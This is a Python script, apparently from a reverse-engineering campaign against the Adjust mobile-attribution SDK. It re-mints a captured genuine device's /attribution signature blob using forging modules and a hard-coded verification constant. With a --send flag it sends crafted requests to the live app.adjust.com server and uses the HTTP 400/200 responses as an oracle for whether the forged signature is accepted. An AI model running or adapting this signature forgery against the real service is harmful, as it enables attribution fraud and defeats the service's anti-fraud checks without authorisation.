# py_ladder.py - THE claim-set / slot ladder on the server's recognition oracle.
#
# Why this exists (2026-09-19):
#   * Every crafted /attribution arm in the campaign signed the request with the
#     27-key SESSION claim set instead of the 21-key ATTRIBUTION set
#     (rev/WALL_A_SLICE_107.md), and every crafted /session arm re-used per-call
#     slots from a DIFFERENT signing.
#   * verify_genuine2.py re-minted the GENUINE device /attribution signature with
#     kind='session' and got 44/48 dwords wrong (vg4.log). The attribution law was
#     never used for it, and the re-mint was never SENT.
#   * recog_probe3 measured the oracle semantics (rev/WALL_A_SLICE_99.md 8.1/8.2):
#         HTTP 400 + {"ask_in":7200000}  = the server RECOGNIZED the package
#         HTTP 200 + wy7261z/Organic     = it did NOT
#     and changing a CLAIM of a genuine blob -> 200, while changing a header-only
#     param -> still 400.
#
# So this script re-mints the genuine /attribution payload with the CORRECT
# attribution law and measures whether the server now recognizes OUR bytes.
#
#   python py_ladder.py            # offline: recon + mint + diff only
#   python py_ladder.py --send     # + the recognition ladder (live)
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
sys.stdout.reconfigure(line_buffering=True)
import adj9_forge as F
from header_gen import make_header
from desc10_law import desc10_keys

UA = "Dalvik/2.1.0 (Linux; U; Android 12; moto g42 Build/S2SE32.28-28-4)"
GEN_AUTH = "KlcAG2cbAAsKSl1KVi0FGiJbDHMI"     # the golden constant
DIRECT = urllib.request.build_opener(urllib.request.ProxyHandler({}))
OUT = os.path.join(HERE, "py_ladder_result.json")
RES = {}


def send(path, params, blob, auth=None, method="GET", ua=UA):
    auth = auth or F.auth_header(blob)
    if method == "POST":
        req = urllib.request.Request("https://app.adjust.com" + path,
                                     data=urllib.parse.urlencode(params).encode(),
                                     method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    else:
        req = urllib.request.Request(
            "https://app.adjust.com%s?%s" % (path, urllib.parse.urlencode(params)),
            method="GET")
    req.add_header("Client-SDK", "android5.7.0")
    req.add_header("Authorization", auth)
    req.add_header("User-Agent", ua)
    req.add_header("Accept-Encoding", "identity")
    try:
        with DIRECT.open(req, timeout=30) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, str(e)


def tag(code):
    return "RECOGNIZED(400)" if code == 400 else (
        "not-recognized(200)" if code == 200 else "HTTP %s" % code)


# ---------------------------------------------------------------- recon -----
def recon():
    d = json.load(open(os.path.join(HERE, "genuine_attr_reqs.json"),
                       encoding="utf-8"))
    print("=== genuine /attribution auth header fields (%d units) ===" % len(d))
    seen = {}
    for u in d:
        a = u.get("auth", "")
        m = dict(re.findall(r'([a-z_]+)="([^"]*)"', a))
        fields = {k: v for k, v in m.items() if k != "signature"}
        seen.setdefault(json.dumps(fields, sort_keys=True), []).append(a)
    for key, a in seen.items():
        print("  x%d fields=%s   raw[0:%d]=%r" % (len(a), key, len(a[0]), a[0][:150]))
    ours = dict(re.findall(r'([a-z_]+)="([^"]*)"', F.auth_header(bytes(192))))
    ours.pop("signature", None)
    print("  OUR auth_header fields: %s" % json.dumps(ours, sort_keys=True))
    print("  -> genuine auth strings all share our field set: %s"
          % all(set(json.loads(k)) == set(ours) for k in seen))
    return d


# ------------------------------------------------------- mints + sends -----
def main():
    do_send = "--send" in sys.argv
    recon()
    G = json.load(open(os.path.join(HERE, "fresh_genuine.json"), encoding="utf-8"))
    qs = G["query"].split("?", 1)[1]
    val = {k: v[0] for k, v in urllib.parse.parse_qs(qs, keep_blank_values=True).items()}
    blob_gen = bytes.fromhex(G["blob_hex"])
    second = 1789474915
    print("\n=== the genuine unit under test ===")
    print("  gps=%s  created_at=%s" % (val.get("gps_adid"), val.get("created_at")))
    print("  blob %d B  header=%s" % (len(blob_gen), blob_gen[:16].hex()))
    print("  header == Random3(%d): %s"
          % (second, blob_gen[:16] == make_header(second)))

    # the law keys for /attribution, filled from the query + header constants
    FILL = {"adj_signing_id": "1500000", "activity_kind": "attribution",
            "client_sdk": "android5.7.0", "headers_id": "10",
            "native_version": "5.0.0", "adj_verification": GEN_AUTH}
    val_att = dict(FILL)
    val_att.update(val)
    keys = desc10_keys("attribution", val_att)
    missing = [k for k in keys if not val_att.get(k)]
    print("\n=== attribution claim set ===")
    print("  %d values; missing from query+constants: %s"
          % (len(keys), missing or "NONE"))
    if missing:
        print("  !! cannot build the law without them - aborting mint")
        return 1

    t0 = time.time()
    st, blob_our, desc, unp = F.make_signature_law(val_att, "attribution",
                                                   second=second)
    print("\n=== our re-mint (kind=attribution, same claims, same second) ===")
    print("  status=%s  #10=%d B (unpadded %d)  blob=%d B  %.1fs"
          % (st, len(desc), unp, len(blob_our), time.time() - t0))
    print("  header law OK: %s" % (blob_our[:16] == make_header(second)))
    diff = [i for i in range(48)
            if blob_our[i * 4:i * 4 + 4] != blob_gen[i * 4:i * 4 + 4]]
    print("  vs genuine blob: equal=%s  differing=%d/48 %s"
          % (blob_our == blob_gen, len(diff), diff[:12]))
    RES["mint"] = {"status": st, "desc10_len": len(desc), "unpadded": unp,
                   "equal": blob_our == blob_gen, "diff_dwords": diff,
                   "claim_keys": keys}

    if not do_send:
        json.dump(RES, open(OUT, "w"), indent=1)
        print("\n(offline only - re-run with --send for the recognition ladder)")
        return 0

    # ---- the ladder -------------------------------------------------------
    arms = []

    def run(label, params, blob, auth=None, note=""):
        code, body = send("/attribution", params, blob, auth=auth)
        print("  %-34s -> %-20s %s" % (label, tag(code),
                                       body.strip().replace("\r\n", "")[:80]))
        arms.append({"label": label, "http": code, "verdict": tag(code),
                     "body": body[:400], "note": note})
        time.sleep(2)
        return code

    print("\n=== RECOGNITION LADDER (live) ===")
    print("  oracle: 400 + ask_in:7200000 = RECOGNIZED ; 200 + wy7261z/Organic = NOT")
    flip = bytearray(blob_gen)
    flip[-1] ^= 1
    flip = bytes(flip)
    ours_flip = bytearray(blob_our)
    ours_flip[-1] ^= 1
    ours_flip = bytes(ours_flip)
    bad = dict(val)
    bad["api_level"] = "30"
    tol = dict(val)
    tol["ui_mode"] = "0"
    run("A0 genuine verbatim (control)", val, blob_gen,
        note="genuine blob + genuine query")
    run("A1 our re-mint (law=attribution)", val, blob_our,
        note="KEY: same claims+second, OUR bytes")
    run("A2 genuine blob, 1 body bit flipped", val, flip,
        note="sanity: blob bytes matter")
    run("A3 our re-mint, 1 body bit flipped", val, ours_flip,
        note="does the flip hurt OUR package?")
    run("A4 genuine blob, claim api_level=30", bad, blob_gen,
        note="known claim sensitivity -> 200")
    run("A5 genuine blob, ui_mode=0", tol, blob_gen,
        note="tolerated key -> still 400")
    RES["arms"] = arms
    json.dump(RES, open(OUT, "w"), indent=1)
    print("\nsaved %s" % OUT)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())